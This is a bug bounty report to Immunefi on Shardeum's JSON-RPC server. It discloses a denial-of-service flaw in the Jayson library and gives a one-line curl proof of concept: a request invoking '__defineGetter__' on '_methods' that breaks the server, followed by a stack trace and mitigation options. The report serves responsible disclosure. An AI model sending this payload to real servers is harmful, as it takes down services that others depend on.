# Boost \_ Shardeum\_ Ancillaries 33577 - \[Websites and Applications - Insight] Taking down the HTTP ser

Submitted on Tue Jul 23 2024 19:52:16 GMT-0400 (Atlantic Standard Time) by @anton\_quantish for [Boost | Shardeum: Ancillaries](https://immunefi.com/bounty/shardeum-ancillaries-boost/)

Report ID: #33577

Report type: Websites and Applications

Report severity: Insight

Target: <https://github.com/shardeum/json-rpc-server/tree/dev>

Impacts:

* Taking down the application/website

## Description

## Brief/Intro

After finding <https://bugs.immunefi.com/dashboard/submission/33571> I started to play around the same code of your HTTP server which is built on Jayson and, accidentally, found a similar 0-day vulnerability there. It requires just a single request to completely take down the application.

## Vulnerability Details

The vulnerability works a very similar way. When you create the Jayson server instance, you pass the methods into constructor:

```
const server = new jayson.Server(methods)
```

They are then parsed and stored within `server._methods` mapping. When the request is sent to the server, it first resolves the methods the following way:

```
Server.prototype.getMethod = function(name) {
  return this._methods[name];
};
```

and then executes it passing the args inside:

```
handler.call(server, ...args);
```

As far as I understand, such a call is equivalent to

```js
server[method](...args);
```

This way, we can override some server fields using the same `__defineGetter__` function. I tried to override the `_methods` field itself and completely broke the server (look at PoC).

## Impact Details

Complete HTTP server take down.

## Proof of concept

## Proof of Concept

1. Start the JSON-RPC server
2. Send the following request with cURL:

```
curl http://172.16.205.128:8080 -X POST -H "Content-Type: application/json" --data '{"jsonrpc":"2.0","method":"__defineGetter__","params":["_methods"],"id":1}'
```

3. Try to send any valid request, for instance

```
curl http://172.16.205.128:8080 -X POST -H "Content-Type: application/json" --data '{"jsonrpc":"2.0","method":"eth_gasPrice","params":[],"id":1}'
```

4. Make sure the traceback is returned and the same traceback is in server logs:

```
Error [ERR_HTTP_HEADERS_SENT]: Cannot set headers after they are sent to the client
    at new NodeError (node:internal/errors:399:5)
    at ServerResponse.setHeader (node:_http_outgoing:645:11)
    at ServerResponse.writeHead (node:_http_server:378:21)
    at /home/quantish/shardeum/json-rpc-server/node_modules/jayson/lib/server/middleware.js:51:15
    at Utils.JSON.stringify (/home/quantish/shardeum/json-rpc-server/node_modules/jayson/lib/utils.js:290:3)
    at /home/quantish/shardeum/json-rpc-server/node_modules/jayson/lib/server/middleware.js:39:18
    at callback (/home/quantish/shardeum/json-rpc-server/node_modules/jayson/lib/server/index.js:241:22)
    at respond (/home/quantish/shardeum/json-rpc-server/node_modules/jayson/lib/server/index.js:292:9)
    at Server._methods (/home/quantish/shardeum/json-rpc-server/node_modules/jayson/lib/server/index.js:329:7)
    at Server.getMethod (/home/quantish/shardeum/json-rpc-server/node_modules/jayson/lib/server/index.js:190:15)
```

I think the different impacts are also possible here but I didn't dive deeper. The RCE couldn't be achieved though I think.

## Mitigation

Since this is a 0-day vulnerability in the 3rd-party library, I think you have the following options:

* report this issue to the vendor and await for the fix to be implemented (I can assist you with that if you want me to);
* use some other JSON-RPC server library.
